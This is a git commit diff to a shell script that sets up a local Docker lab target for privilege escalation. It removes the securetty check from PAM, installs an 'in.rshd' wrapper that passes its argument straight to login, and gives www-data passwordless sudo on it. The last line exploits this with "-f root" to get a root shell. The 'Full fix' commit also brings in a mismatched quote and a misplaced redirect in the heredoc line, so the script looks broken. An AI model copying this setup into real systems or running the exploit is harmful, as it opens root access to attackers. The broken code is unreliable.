4476153eae17b22f77c5e7d4e34840d404133410
FreeBSDKernel9-0 <coconutrepairs@gmail.com>
2026-09-03 18:10:50 +0100

    Full fix.

--- General Linux Stuff (BusyBox embedded junk)/rCat.sh
+++ General Linux Stuff (BusyBox embedded junk)/rCat.sh
@@ -7,21 +7,20 @@ sleep 2
 
 # Get sudo (you need it) and fix PAM
 docker exec -u root local_target sh -c 'apt-get update && apt-get install -y sudo'
-docker exec -u root local_target sed -i 's/^auth\s\+required\s\+pam_securetty.so/# auth required pam_securetty.so/' /etc/pam.d/login
+docker exec -u root local_target sed -i '/pam_securetty.so/d' /etc/pam.d/login
 
 # Set the custom (root) prompt, as the normal ones suck
 docker exec -u root local_target sh -c 'echo "export PS1=\"root@apache: # \"" >> /root/.bashrc'
 
 # Close the file, put shell args (don't do that in real stuff)
-docker exec -u root local_target sh -c 'cat << "EOF" > /usr/local/bin/in.rshd
+docker exec -u root local_target sh -c 'cat << "EOF" ' > /usr/local/bin/in.rshd
 INPUT_ARGS=$1
 exec /usr/bin/login $INPUT_ARGS
 EOF
 chmod +x /usr/local/bin/in.rshd
 
-# Create the rule, to run the in.rshd daemon as (root)
+# Add the sudoers rule, to run in.rshd as (root)
 echo "www-data ALL=(root) NOPASSWD: /usr/local/bin/in.rshd" | docker exec -i local_target sh -c 'cat >> /etc/sudoers'
 
-
-
-
+# Exploit the crappy rshd, with "-f root" to drop a (root) shell
+docker exec -it -u www-data local_target sudo /usr/local/bin/in.rshd "-f root"
